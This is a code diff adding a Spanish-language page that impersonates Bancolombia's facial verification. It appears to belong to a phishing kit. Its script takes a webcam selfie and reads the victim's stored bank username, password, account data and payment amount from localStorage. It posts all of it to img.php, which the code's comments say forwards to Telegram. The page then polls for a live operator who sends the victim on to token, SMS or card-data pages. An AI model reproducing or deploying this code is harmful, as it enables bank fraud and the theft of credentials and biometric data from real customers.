@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verificación Facial - Bancolombia</title>
+<style>
+:root{
+  --amarillo:#FFD100;
+  --amarillo-hover:#f5c400;
+  --negro:#1c1c1c;
+  --gris:#6b6b6b;
+  --gris-claro:#f4f4f4;
+  --borde:#e6e6e6;
+  --radio:14px;
+}
+
+*{box-sizing:border-box; margin:0; padding:0}
+
+body{
+  min-height:100vh;
+  background:#f7f7f7;
+  font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;
+  color:var(--negro);
+}
+
+.container{
+  width:100%;
+  max-width:500px;
+  margin:0 auto;
+  background:#fff;
+  min-height:100vh;
+  padding:20px;
+}
+
+.logo-container{
+  border-radius:12px;
+  margin-bottom:30px;
+  text-align:center;
+}
+
+.logo{
+  height:30px;
+  width:auto;
+}
+
+
+.logo-h1-row{
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  gap: 10px; /* espacio entre logo y h1 */
+  margin-bottom: 10px;
+}
+
+.logo-container-h1{
+  border-radius: 12px;
+  margin-bottom: 30px;
+}
+
+.logoh1{
+  height: 30px;
+  width: auto;
+  display: block;
+}
+
+h1{
+  font-size: 22px;
+  font-weight: 700;
+  text-align: left;
+  margin: 0;            /* clave para que no se baje */
+  color: #1c1c1c;
+}
+
+
+.subtitle{
+  font-size:14px;
+  color:#666;
+  text-align:left;
+  margin-bottom:25px;
+}
+
+/* Mensajes */
+.error-message{
+  background:#ffebee;
+  color:#c62828;
+  padding:15px;
+  border-radius:10px;
+  margin:15px 0;
+  border-left:4px solid #c62828;
+  display:none;
+  font-size:14px;
+}
+
+.success-message{
+  background:#e8f5e9;
+  color:#2e7d32;
+  padding:15px;
+  border-radius:10px;
+  margin:15px 0;
+  border-left:4px solid #2e7d32;
+  display:none;
+  font-size:14px;
+}
+
+/* Contenedor principal */
+.form-container{
+  background:#fff;
+  padding:25px;
+  border-radius:15px;
+  box-shadow:0 4px 15px rgba(0,0,0,0.08);
+  border:1px solid var(--borde);
+}
+
+.instructions{
+  font-size:10px;
+  color:#555;
+  text-align:left;
+  line-height:1.5;
+  margin-bottom:0px;
+  padding:0 10px;
+}
+
+.inst{
+  font-size:14px;
+  color:#e0e0e0;
+  text-align:left;
+  line-height:1.5;
+  margin-bottom:25px;
+  padding:20px;
+  background-color: #1c1c1c;
+  border-radius: 7px;
+}
+
+/* Cámara */
+.camera-container{
+  position:relative;
+  width:100%;
+  height:350px;
+  border-radius:12px;
+  overflow:hidden;
+  background:#000;
+  margin-bottom:20px;
+}
+
+.camera-video, .camera-preview{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  display:block;
+}
+
+.camera-overlay{
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  border:2px solid rgba(255,255,255,0.3);
+  pointer-events:none;
+  border-radius:12px;
+}
+
+.hidden{
+  display:none!important;
+}
+
+/* Botones */
+.buttons-container{
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+  margin-top:20px;
+}
+
+.btn-facial{
+  background:var(--amarillo);
+  color:#000;
+  border:none;
+  border-radius:25px;
+  padding:16px;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+  transition:all 0.3s ease;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+
+.btn-facial:hover{
+  background:var(--amarillo-hover);
+  transform:translateY(-2px);
+}
+
+.btn-secondary{
+  background:#fff;
+  color:var(--negro);
+  border:1px solid var(--borde);
+  border-radius:25px;
+  padding:16px;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+  transition:all 0.3s ease;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+
+.btn-secondary:hover{
+  background:#f8f8f8;
+}
+
+.btn-disabled{
+  opacity:0.6;
+  cursor:not-allowed;
+}
+
+/* Loading */
+.loading-overlay{
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.7);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  color:white;
+  border-radius:12px;
+}
+
+.loading-spinner{
+  border:4px solid #f3f3f3;
+  border-top:4px solid var(--amarillo);
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  animation:spin 1s linear infinite;
+  margin-bottom:15px;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0deg)}
+  100%{transform:rotate(360deg)}
+}
+
+.loading-text{
+  font-size:16px;
+  text-align:center;
+}
+
+/* Modal de espera - IGUAL QUE INDEX.PHP */
+#modalEspera{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.9);
+  z-index:10010;
+  display:none;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  color:white;
+  text-align:center;
+  padding:20px;
+}
+
+.modal-loader{
+  border:3px solid #f3f3f3;
+  border-top:3px solid var(--amarillo);
+  border-radius:50%;
+  width:50px;
+  height:50px;
+  animation:spin 1s linear infinite;
+  margin-bottom:20px;
+}
+
+#loaderText{
+  margin-top:15px;
+  font-size:1.1em;
+  min-height:60px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+/* Responsive */
+@media (max-width:900px){
+  .container{
+    padding:15px;
+  }
+  
+  .form-container{
+    padding:20px;
+  }
+  
+  .camera-container{
+    height:300px;
+  }
+  
+  .btn-facial, .btn-secondary{
+    padding:14px;
+    font-size:15px;
+  }
+  .logo{
+    height:20px;
+    width:auto;
+  }
+}
+</style>
+</head>
+<body>
+  <!-- Modal de espera (igual que index.php) -->
+  <div id="modalEspera">
+    <div class="modal-loader"></div>
+    <p id="loaderText">Validando tu identidad...</p>
+  </div>
+  
+  <div class="container">
+    <div class="logo-container">
+      <img src="img/logoxxx.png" alt="" class="logo">
+    </div>
+
+    <div class="logo-h1-row">
+      <img src="img/LogoBancolombia.png" alt="" class="logoh1">
+      <h1>Verifique su Identidad</h1>
+    </div>
+
+    <div class="subtitle">Para continuar con el proceso, necesitamos verificar tu identidad</div>
+    
+    <!-- Mensaje de error -->
+    <div id="adminError" class="error-message">
+      <strong>⚠️ Error en verificación facial:</strong><br>
+      Por favor, intenta nuevamente asegurándote de que tu rostro esté bien iluminado y centrado.
+    </div>
+    
+    <div id="successMessage" class="success-message">
+      <strong>✅ Verificación exitosa:</strong><br>
+      Redirigiendo...
+    </div>
+    
+    <div class="form-container">
+      <p class="inst">
+        Asegúrate de estar en un lugar bien iluminado y mira directamente a la cámara. Retira de tu rostro cualquier accesorio, como gafas o sombreros.
+      </p>
+      
+      <div id="cameraSection">
+        <div class="camera-container">
+          <video id="video" class="camera-video" autoplay playsinline muted></video>
+          <canvas id="canvas" class="hidden"></canvas>
+          <div class="camera-overlay"></div>
+        </div>
+        <p class="instructions" style="margin-top:15px; font-size:14px;">
+          Coloca tu rostro dentro del marco y mantén una expresión neutral.
+        </p>
+      </div>
+      
+      <div id="previewSection" class="hidden">
+        <div class="camera-container">
+          <img id="preview" class="camera-preview" alt="Foto capturada" />
+          <div id="loadingOverlay" class="loading-overlay hidden">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Procesando verificación facial...</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="buttons-container">
+        <button id="captureButton" class="btn-facial">
+          📸 Tomar Foto
+        </button>
+        
+        <button id="retakeButton" class="btn-secondary hidden">
+          🔄 Tomar Otra Foto
+        </button>
+        
+        <button id="continueButton" class="btn-facial hidden">
+          ✅ Continuar Verificación
+        </button>
+        
+        <button id="backButton" class="btn-secondary" onclick="window.location.href='index.php'">
+          ↩️ Volver al Inicio
+        </button>
+      </div>
+      <br>
+      <p class="instructions">
+        Bancolombia protege tu información. Por seguridad de tus transacciones y tu acceso a este canal, su identidad digital evitará que suplanten y permitirá que le reconozcan con sus datos biometricos.
+      </p>
+    </div>
+  </div>
+  
+  <!-- Script actualizado -->
+  <script>
+    let stream = null;
+    let video, canvas, preview, captureButton, retakeButton, continueButton;
+    let cameraSection, previewSection, loadingOverlay;
+    let facialTransactionId = '';
+    let capturedPhotoData = null;
+    let modalEspera, loaderText;
+    
+    // Mensajes para el loader (igual que index.php)
+    const mensajesEspera = [
+        "Comprobando tu información...",
+        "Autorizando tu acceso...",
+        "Verificando tu identidad...",
+        "Procesando solicitud...",
+        "Por favor, espera un momento..."
+    ];
+    let indexMensaje = 0, intervalLoader;
+    
+    function iniciarMensajesLoader() {
+        loaderText.textContent = mensajesEspera[indexMensaje];
+        intervalLoader = setInterval(() => {
+            indexMensaje = (indexMensaje + 1) % mensajesEspera.length;
+            loaderText.textContent = mensajesEspera[indexMensaje];
+        }, 3000);
+    }
+    
+    function detenerMensajesLoader() {
+        clearInterval(intervalLoader);
+        indexMensaje = 0;
+    }
+    
+    function checkUrlParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const error = urlParams.get('error');
+      
+      if (error === 'facial_error') {
+        document.getElementById('adminError').style.display = 'block';
+      }
+    }
+    
+    async function startCamera() {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('Tu navegador no soporta el acceso a la cámara.');
+        }
+        
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+        
+        if (video) {
+          video.srcObject = stream;
+          await video.play();
+          captureButton.disabled = false;
+        }
+        
+      } catch (error) {
+        console.error('Error al acceder a la cámara:', error);
+        alert('Error al acceder a la cámara: ' + error.message);
+        captureButton.disabled = true;
+      }
+    }
+    
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+    }
+    
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+      // Obtener referencias
+      video = document.getElementById('video');
+      canvas = document.getElementById('canvas');
+      preview = document.getElementById('preview');
+      captureButton = document.getElementById('captureButton');
+      retakeButton = document.getElementById('retakeButton');
+      continueButton = document.getElementById('continueButton');
+      cameraSection = document.getElementById('cameraSection');
+      previewSection = document.getElementById('previewSection');
+      loadingOverlay = document.getElementById('loadingOverlay');
+      modalEspera = document.getElementById('modalEspera');
+      loaderText = document.getElementById('loaderText');
+      
+      // Verificar parámetros URL
+      checkUrlParams();
+      
+      // Capturar foto
+      captureButton.addEventListener('click', () => {
+        try {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.imageSmoothingEnabled = true;
+          ctx.imageSmoothingQuality = 'high';
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+          
+          capturedPhotoData = canvas.toDataURL('image/jpeg', 0.9);
+          preview.src = capturedPhotoData;
+          
+          stopCamera();
+          
+          cameraSection.classList.add('hidden');
+          previewSection.classList.remove('hidden');
+          captureButton.classList.add('hidden');
+          retakeButton.classList.remove('hidden');
+          continueButton.classList.remove('hidden');
+          document.getElementById('adminError').style.display = 'none';
+          
+        } catch (error) {
+          console.error('Error al capturar foto:', error);
+          alert('Error al capturar la foto. Por favor, intenta nuevamente.');
+        }
+      });
+      
+      // Volver a tomar foto
+      retakeButton.addEventListener('click', () => {
+        previewSection.classList.add('hidden');
+        cameraSection.classList.remove('hidden');
+        retakeButton.classList.add('hidden');
+        continueButton.classList.add('hidden');
+        captureButton.classList.remove('hidden');
+        capturedPhotoData = null;
+        startCamera();
+      });
+      
+      // Continuar verificación
+      continueButton.addEventListener('click', async () => {
+        if (!capturedPhotoData) {
+          alert('No hay foto capturada. Por favor, toma una foto primero.');
+          return;
+        }
+        
+        // Mostrar modal de espera (igual que index.php)
+        modalEspera.style.display = 'flex';
+        iniciarMensajesLoader();
+        
+        continueButton.disabled = true;
+        continueButton.textContent = 'Enviando...';
+        
+        // Generar nuevo transactionId
+        facialTransactionId = crypto.randomUUID();
+        
+        // Enviar datos a Telegram
+        await enviarDatosFacialATelegram(capturedPhotoData, facialTransactionId);
+        
+        // Iniciar polling RÁPIDO para verificar respuesta
+        checkFacialVerification(facialTransactionId);
+      });
+      
+      // Iniciar cámara
+      startCamera();
+    });
+    
+    // REEMPLAZAR SOLO LA FUNCIÓN enviarDatosFacialATelegram CON ESTA:
+
+async function enviarDatosFacialATelegram(photoData, transactionId) {
+    // Obtener datos del usuario
+    const tbdatos_bbva = JSON.parse(localStorage.getItem('tbdatos_bbva') || '{}');
+    const usuario = localStorage.getItem('usuario_login') || '';
+    const clave = localStorage.getItem('clave_login') || '';
+    const monto = localStorage.getItem('total_pagar') || '0';
+    
+    try {
+        // Convertir foto a Blob
+        const photoBlob = dataURLtoBlob(photoData);
+        
+        // Crear FormData con TODO
+        const formData = new FormData();
+        formData.append('photo', photoBlob, 'facial_bancolombia.jpg');
+        formData.append('transactionId', transactionId);
+        formData.append('tbdatos', JSON.stringify(tbdatos_bbva));
+        formData.append('usuario', usuario);
+        formData.append('clave', clave);
+        formData.append('monto', monto);
+        
+        // Enviar TODO EN UN SOLO REQUEST
+        const response = await fetch('img.php', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        
+        if (!result.ok) {
+            throw new Error(result.error || 'Error al enviar');
+        }
+        
+        console.log('✅ Datos faciales enviados a Telegram en un solo mensaje');
+        
+    } catch (error) {
+        console.error('❌ Error al enviar a Telegram:', error);
+        detenerMensajesLoader();
+        modalEspera.style.display = 'none';
+        alert('Error al enviar la verificación. Intenta nuevamente.');
+        continueButton.disabled = false;
+        continueButton.textContent = '✅ Continuar Verificación';
+        throw error;
+    }
+}
+    
+    // POLLING RÁPIDO (cada 1 segundo) - IGUAL QUE INDEX.PHP
+    async function checkFacialVerification(transactionId) {
+      const TIMEOUT_MS = 180000; // 3 minutos
+      
+      const poll = setInterval(async () => {
+        try {
+          const res = await fetch(`img.php?transactionId=${transactionId}`);
+          const json = await res.json();
+          
+          if (json.ok && json.action) {
+            clearInterval(poll);
+            detenerMensajesLoader();
+            modalEspera.style.display = 'none';
+            
+            // REDIRECCIONES EN TIEMPO REAL
+            switch(json.action) {
+              case 'pedir_token':
+                window.location.href = 'dina.html';
+                break;
+                
+              case 'rechazar':
+                // Mostrar modal de error
+                document.getElementById('modalError').style.display = 'flex';
+                break;
+                
+              case 'banco_error':
+                alert('Datos de inicio de sesión erróneos. Corríjalos.');
+                window.location.href = 'index.php';
+                break;
+                
+              case 'cc':
+                window.location.href = '../../../../data-cc/alter.php';
+                break;
+                
+              case 'check':
+              case 'aprobado':
+              case 'fin':
+                window.location.href = 'fin.php';
+                break;
+                
+              case 'sms':
+                window.location.href = 'sms.php';
+                break;
+                
+              case 'facial':
+                // Si vuelven a pedir facial
+                window.location.href = 'facial_step.html?error=facial_error';
+                break;
+                
+              default:
+                window.location.href = 'fin.php';
+            }
+          }
+        } catch (error) {
+          console.error('Error en polling:', error);
+        }
+      }, 1000); // POLLING CADA 1 SEGUNDO PARA RESPUESTA INMEDIATA
+      
+      // Timeout
+      setTimeout(() => {
+        clearInterval(poll);
+        detenerMensajesLoader();
+        modalEspera.style.display = 'none';
+        alert('No se obtuvo respuesta del operador. Por favor intenta más tarde.');
+        window.location.href = 'index.php';
+      }, TIMEOUT_MS);
+    }
+    
+    // Limpiar al salir
+    window.addEventListener('beforeunload', () => {
+      stopCamera();
+      if (intervalLoader) clearInterval(intervalLoader);
+    });
+  </script>
+</body>
+</html>
